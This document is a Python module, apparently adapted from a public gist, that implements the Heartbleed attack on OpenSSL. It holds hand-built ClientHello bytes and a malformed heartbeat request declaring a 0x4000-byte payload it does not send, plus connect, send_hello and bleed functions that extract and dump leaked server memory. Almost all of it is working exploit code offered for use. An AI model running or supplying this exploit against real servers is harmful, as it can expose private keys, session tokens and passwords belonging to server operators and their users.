"""
Heartbleeder module
Original code: https://gist.github.com/eelsivart/10174134

Usage:
  - use connect() to connect to a server
  - then use send_hello() to send a ClientHello (should be executed once)
  - then use bleed() to send a Heartbeat request
  - you can wait and send bleed() again if you want to get more data

TLS versions: 0x01 = 1.0, 0x02 = 1.1, 0x03 = 1.2
"""

import codecs
import random
import sys
import struct
import socket
import re
import time
from typing import Iterable, List, Tuple, Optional

#
decode_hex = codecs.getdecoder('hex_codec')


def _hex2bin(arr: Iterable[int]) -> bytes:
    return bytes.fromhex(''.join('{:02x}'.format(x) for x in arr))


def _build_client_hello(tls_ver: int = 0x01) -> List[int]:
    return [
        # TLS header ( 5 bytes)
        0x16,  # Content type (0x16 for handshake)
        0x03, tls_ver,  # TLS Version
        0x00, 0xdc,  # Length
        # Handshake header
        0x01,  # Type (0x01 for ClientHello)
        0x00, 0x00, 0xd8,  # Length
        0x03, tls_ver,  # TLS Version
        # Random (32 byte)
        0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,
        0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,
        0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,
        0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,
        0x00,  # Session ID length
        0x00, 0x66,  # Cipher suites length
        # Cipher suites (51 suites)
        0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,
        0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,
        0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,
        0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,
        0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,
        0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,
        0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,
        0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,
        0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,
        0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,
        0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,
        0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,
        0x00, 0x06, 0x00, 0x03, 0x00, 0xff,
        0x01,  # Compression methods length
        0x00,  # Compression method (0x00 for NULL)
        0x00, 0x49,  # Extensions length
        # Extension: ec_point_formats
        0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
        # Extension: elliptic_curves
        0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,
        0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
        0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,
        0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
        0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,
        0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
        0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,
        # Extension: SessionTicket TLS
        0x00, 0x23, 0x00, 0x00,
        # Extension: Heartbeat
        0x00, 0x0f, 0x00, 0x01, 0x01
    ]


def _build_heartbeat(tls_ver: int = 0x01) -> List[int]:
    return [
        0x18,  # Content Type (Heartbeat)
        0x03, tls_ver,  # TLS version
        0x00, 0x03,  # Length
        # Payload
        0x01,  # Type (Request)
        0x40, 0x00  # Payload length
    ]


def _hexdump(payload: bytes) -> str:
    pdat = ''
    for b in range(0, len(payload), 16):
        lin = [c for c in payload[b: b + 16]]
        pdat += ''.join((chr(c) if ((32 <= c <= 126) or (c == 10) or (c == 13)) else '.') for c in lin)
    pdat = re.sub(r'([.]{50,})', '', pdat)
    return pdat


def _rcv_tls_record(connection: socket.socket) -> Optional[Tuple[int, int, bytes]]:
    try:
        tls_header = connection.recv(5)
        if not tls_header:
            print('Unexpected EOF (header)')
            return None
        typ, ver, length = struct.unpack('>BHH', tls_header)
        message = b''
        while True:
            received = connection.recv(length - len(message))
            if not received:
                break
            message += received
        if not message:
            print('Unexpected EOF (message)')
            return None
        return typ, ver, message
    except Exception as e:
        print("\nError Receiving Record! " + str(e))
        return None


def bleed(connection: socket.socket, tls_ver: int = 0x01) -> Optional[str]:
    connection.send(_hex2bin(_build_heartbeat(tls_ver)))
    time.sleep(1)
    while True:
        result = _rcv_tls_record(connection)
        if result is None:
            print('No heartbeat response received, server likely not vulnerable')
            return None
        else:
            typ, ver, pay = result

        if typ == 24:
            if len(pay) > 3:
                return _hexdump(pay)
            else:
                print('Server processed malformed heartbeat, but did not return any extra data.')


def connect(dst_address: str, dst_port: int, src_port: int = None) -> socket.socket:
    try:
        src_port = src_port or random.randint(50000, 60000)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sys.stdout.flush()
        s.settimeout(30)
        time.sleep(0.2)
        s.bind(('0.0.0.0', src_port))
        s.connect((dst_address, dst_port))
        return s

    except Exception as e:
        print("Connection Error! " + str(e))
        raise


def send_hello(connection: socket.socket, tls_ver: int = 0x01) -> None:
    connection.send(_hex2bin(_build_client_hello(tls_ver)))
